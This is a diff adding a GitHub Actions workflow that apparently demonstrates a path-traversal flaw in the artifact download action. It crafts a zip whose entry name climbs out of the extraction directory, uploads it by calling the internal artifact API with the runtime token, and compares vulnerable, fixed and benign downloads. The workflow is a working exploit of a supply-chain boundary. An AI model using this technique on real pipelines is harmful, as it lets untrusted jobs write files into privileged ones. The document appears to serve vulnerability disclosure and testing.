@@ -1,0 +1,74 @@
+name: art024-job-boundary
+on:
+  push:
+    branches: [art024]
+permissions:
+  contents: read
+jobs:
+  untrusted:
+    runs-on: ubuntu-latest
+    steps:
+      - name: build artifact zips (crafted + benign control)
+        run: |
+          python3 - <<'PY'
+          import zipfile
+          z=zipfile.ZipFile('crafted.zip','w')
+          z.writestr('benign.txt','hello from job untrusted\n')
+          z.writestr('foo/../../../../../../../../../../tmp/uzs/poc/ESCAPED.txt','written outside the extraction directory by the artifact\n')
+          z.close()
+          b=zipfile.ZipFile('benign.zip','w'); b.writestr('benign.txt','control\n'); b.close()
+          PY
+          ls -la crafted.zip benign.zip
+      - name: upload both zips verbatim through the artifact v4 API
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const base = process.env.ACTIONS_RESULTS_URL;
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            const m = claims.scp.match(/Actions\.Results:([^:\s]+):([^:\s]+)/);
+            const ids = { workflow_run_backend_id: m[1], workflow_job_run_backend_id: m[2] };
+            const h = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json', 'Accept': 'application/json' };
+            for (const [name, file] of [['crafted', 'crafted.zip'], ['benign', 'benign.zip']]) {
+              const zip = fs.readFileSync(file);
+              const c = await (await fetch(base + 'twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', { method: 'POST', headers: h, body: JSON.stringify({ ...ids, name, version: 4 }) })).json();
+              const put = await fetch(c.signed_upload_url, { method: 'PUT', headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'zip' }, body: zip });
+              const f = await (await fetch(base + 'twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', { method: 'POST', headers: h, body: JSON.stringify({ ...ids, name, size: String(zip.length) }) })).json();
+              core.info(`${name}: create ok=${c.ok} put=${put.status} finalize=${JSON.stringify(f)}`);
+            }
+  privileged-download-artifact-v4:
+    needs: untrusted
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: crafted
+          path: dl
+      - name: where did the files land
+        run: |
+          echo "--- inside dl ---"; find dl -type f
+          echo "--- outside: /tmp/uzs/poc ---"; ls -la /tmp/uzs/poc/ 2>&1; cat /tmp/uzs/poc/ESCAPED.txt 2>&1
+  control-download-artifact-v8:
+    needs: untrusted
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v8
+        with:
+          name: crafted
+          path: dl
+      - name: where did the files land (fixed version)
+        run: |
+          echo "--- inside dl ---"; find dl -type f
+          echo "--- outside: /tmp/uzs/poc ---"; ls -la /tmp/uzs/poc/ 2>&1; cat /tmp/uzs/poc/ESCAPED.txt 2>&1
+  control-benign-v4:
+    needs: untrusted
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: benign
+          path: dl
+      - run: |
+          echo "--- inside dl ---"; find dl -type f
+          echo "--- outside: /tmp/uzs/poc ---"; ls -la /tmp/uzs/poc/ 2>&1
